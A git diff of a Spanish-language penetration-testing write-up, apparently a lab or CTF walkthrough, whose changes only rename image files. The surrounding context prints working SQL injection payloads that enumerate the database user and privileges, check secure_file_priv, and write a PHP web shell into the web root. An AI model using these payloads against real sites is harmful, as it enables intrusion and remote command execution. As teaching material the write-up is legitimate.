@@ -336,7 +336,7 @@ Sabiendo el número de columnas (5) vamos a enumerar los usuarios.
 '+UNION+SELECT+NULL,NULL,NULL,USER(),NULL--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 
@@ -344,7 +344,7 @@ Ya sabemos el usuario por lo que hay que ver que privilegios tiene.
 '+UNION+SELECT+NULL,grantee,privilege_type,NULL,NULL+FROM+information_schema.user_privileges+WHERE+grantee%3d"'root'%40'localhost'"--+
 ```
 
-<figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Vemos que tenemos permiso en **FILE** y eso indica que puede tanto escribir y leer en el backend. Comprobamos **secure\_file\_priv** si podemos escribir datos.
 
@@ -352,7 +352,7 @@ Vemos que tenemos permiso en **FILE** y eso indica que puede tanto escribir y le
 '+UNION+SELECT+1,2,3,+variable_name,+variable_value+FROM+information_schema.global_variables+where+variable_name%3d"secure_file_priv"--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Eso significa que podemos escribir datos por lo que hacemos una web shell.
 
@@ -360,7 +360,7 @@ Eso significa que podemos escribir datos por lo que hacemos una web shell.
 '+union+select+"","",'<%3fphp+system($_REQUEST[0])%3b+%3f>',+"",+""+into+outfile+'/var/www/html/shell.php'--+-
 ```
 
-<figure><img src="../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Nos salta un error pero de las tres condiciones necesarias, el usuario ya cuenta con el privilegio **FILE** habilitado y además la variable global **secure\_file\_priv** de MySQL no está activa, por lo que el problema debe encontrarse en la tercera condición, es decir, en la falta de permisos de escritura en la ubicación del servidor donde se pretende guardar el archivo.
 
